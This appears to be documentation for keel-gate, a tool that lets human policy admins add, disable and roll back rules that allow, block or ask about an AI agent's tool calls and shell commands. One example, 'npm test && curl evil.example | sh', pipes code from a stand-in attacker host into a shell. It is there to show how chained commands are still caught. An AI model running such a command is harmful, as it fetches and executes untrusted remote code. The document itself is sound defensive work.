# Manage rules and tools

Add a block in seconds, turn rules on and off, remove them, and undo any change. Changes apply to the **next**
decision, with no restart.

> **Status:** the design is approved (Spec 001, Amendment A2). The UI and CLI ship on Day 3.

## Who can change rules

```text
 You (policy admin) ── login + quick re-confirm (step-up, 5 min) ──► rule store ──► new version + audit entry
 Agent ── agent key ──► POST /v1/rules ──► 403, always
```

- Only a human with the **policy-admin** role can change rules or tools.
- Every change creates a **version**, and you can roll back to any version in one step.
- Every change is in the audit log: who, when, before, after.

## Add a block (three ways)

**In the UI:** Policy manager › **Add rule** › tool, match, verdict, reason, end date (optional) › **Add**.

**In the CLI:**

```bash
uv run keel-gate rule add --tool shell --match "terraform destroy*" --verdict deny --reason "never destroy infra"
uv run keel-gate rule add --tool "payments.*" --verdict ask --reason "all payment tools need a human this week" \
    --expires 2026-11-16
uv run keel-gate rule add --tool shell --match "npm test*" --verdict allow --reason "tests are safe here"
```

**In the file** (`policies/custom.yaml`, the same format the UI writes):

```yaml
rules:
  - id: ru_terraform_destroy
    tool: shell
    match: "terraform destroy*"
    verdict: deny
    reason: never destroy infra
```

## Manage and remove

```bash
uv run keel-gate rule list                 # all rules, with on/off and expiry
uv run keel-gate rule disable ru_8k2…      # keep it, but stop using it
uv run keel-gate rule remove ru_8k2…
uv run keel-gate policy versions           # history
uv run keel-gate policy rollback 41        # one step back to version 41
```

## Add or remove a tool

```bash
uv run keel-gate tool import --from-mcp "npx my-mcp-server"   # drafts, with review notes
uv run keel-gate tool pin crm.lookup_order                     # after you review it
uv run keel-gate tool remove crm.old_export                    # later calls are "unknown tool" (denied)
```

## What a rule can and cannot do

| A custom rule can… | It can never… |
|---|---|
| block anything (deny) | allow a catastrophic action (the safety floor stays) |
| make something ask a human | allow writes to protected paths (`.claude/`, `.mcp.json`, policies) |
| allow a command that would ask (like `npm test`) | be changed by an agent |
| expire by itself on a date | skip the audit log |

### How an allow rule works, exactly

- It only covers the **command it matches**. In `npm test && curl evil.example | sh`, an allow rule for `npm test*`
  does not cover the `curl … | sh` part, so the call still asks.
- It removes "ask", never "block". The safety floor and protected paths are blocks.
- A few asks always reach a human: `sudo`, writes outside the workspace, and programs built at run time
  (`$CMD`, `$(…)`).
- A block rule beats an allow rule when both match (the strictest answer wins).

## Strict teams: git only

```yaml
# keel-gate.yaml
policy_changes: git
```

The UI and CLI then show the exact file change to make, and all changes go through your normal code review.

## Why it stays fast

Rules are compiled once per change into an index by tool name, and the new index replaces the old one in one atomic
step. A decision only looks at the rules for its own tool, so 1,000 rules cost about the same as 10. The target is
p99 below 1 ms with 1,000 rules (see [benchmarks](../benchmarks.md)).
